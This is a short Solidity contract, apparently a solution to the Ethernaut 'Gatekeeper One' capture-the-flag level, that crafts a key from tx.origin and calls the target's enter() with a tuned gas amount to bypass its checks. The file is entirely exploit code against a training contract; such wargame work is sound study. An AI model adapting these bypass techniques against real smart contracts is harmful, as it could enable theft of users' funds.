// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _key) external returns (bool);
}

contract GatekeeperOneHack {
    function attack(address _target) public returns (bool) {
        bytes8 key = bytes8(uint64(0x1000000000000000) + uint16(uint160(tx.origin)));
        require(gasleft() > 200000, "more gas");
        return IGatekeeperOne(_target).enter{gas: (8191 * 10) + 271}(key);
    }
}